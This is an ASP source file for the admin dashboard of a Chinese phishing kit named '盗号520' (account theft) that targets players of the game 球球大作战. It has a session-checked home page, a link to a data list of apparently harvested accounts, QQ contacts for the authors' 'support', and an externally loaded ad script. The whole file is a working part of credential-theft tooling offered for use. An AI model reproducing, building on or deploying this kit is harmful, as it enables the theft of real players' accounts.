<%@LANGUAGE="VBScript" codepage="936"%>
<!--#include file="conn.asp"-->
<%
If session("admin")="" then
    Response.Write "<script>alert('用户未登录，请登录');top.location.href='login.asp';</SCRIPT>"
	Response.End
End If
%>
<!DOCTYPE html>
<html lang="zh-cn">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>后台首页-盗号520程序</title>
  <link href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css" rel="stylesheet"/>
  <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script>
  <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
  
  <!--[if lt IE 9]>
    <script src="http://libs.useso.com/js/html5shiv/3.7/html5shiv.min.js"></script>
    <script src="http://libs.useso.com/js/respond.js/1.4.2/respond.min.js"></script>
  <![endif]-->
</head>
<body>
  <nav class="navbar navbar-fixed-top navbar-default">
    <div class="container">
      <div class="navbar-header">
        <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
          <span class="sr-only">导航按钮</span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
        </button>
        <a class="navbar-brand" href="./">盗号520---球球大作战后台</a>
      </div><!-- /.navbar-header -->
      <div id="navbar" class="collapse navbar-collapse">
       <ul class="nav navbar-nav navbar-right">
		 <li class="active">
           <a href="index.asp"><span class="glyphicon glyphicon-home"></span> 后台首页</a></li>
          <li>
           <a href="list.asp"><span class="glyphicon glyphicon-signal"></span> 数据列表</a>
          </li>
		   <!--修改密码-->
		 <!-- <li><a href="password.asp"><span class="glyphicon glyphicon-transfer"></span> 修改密码</a></li>-->
		    <li><a href="about.asp"><span class="glyphicon glyphicon-tree-deciduous"></span> 关于程序</a></li>
			<li><a href="Exit.asp" target="_parent" ONCLICK="javascript:return confirm('提示：您确定要退出吗？')"><span class="glyphicon glyphicon-log-out"></span> 退出登录</a></li>
        </ul>
      </div><!-- /.navbar-collapse -->
    </div><!-- /.container -->
  </nav><!-- /.navbar -->
  <div class="container" style="padding-top:70px;">
   <div class="col-xs-12 col-sm-10 col-lg-8 center-block" style="float: none;">
	<div class="row">
			<div class="col-md-12">
			<div class="panel panel-primary">
					<div class="panel-heading"><span class="glyphicon glyphicon-stats"><span> 盗号520---球球大作战后台</div>
					  <ul class="list-group">
					  
					 <li class="list-group-item"><span class="glyphicon glyphicon-signal"></span> <b> 程序名称：</b>盗号520-球球钓鱼</li>
					  <li class="list-group-item"><span class="glyphicon glyphicon-tint"></span> <b> 用户权限：</b>超级管理员 </li>
                      <li class="list-group-item"><span class="glyphicon glyphicon-stats"></span> <b>技术支持：</b>盗号520 & 乘风</li>
            <li class="list-group-item"><span class="glyphicon glyphicon-list"></span> <b> 快捷菜单：</b> 
              <a href="list.asp" class="btn btn-xs btn-success">数据列表</a>
              <a href="http://wpa.qq.com/msgrd?v=3&uin=744768811&site=qq&menu=yes" class="btn btn-xs btn-success">联系乘风</a></li>

				
			</div><!--/.col-->
			</div>
			
		</div><!--/.row-->
		<div class="alert bg-danger" role="alert">
					<span class="glyphicon glyphicon-info-sign"></span><strong> 公告:</strong> 官方交流群600196169 请勿用于非法活动<a href="#" class="pull-right"><span class="glyphicon glyphicon-remove"></span></a>
				</div> </div> </div>
			
   


</body>
</html>
<!--九盟文字广告代码-->
<script charset="gb2312" src="http://c1.yunluge.com/appios_c_1.asp?pid=23657&sid=7"></script>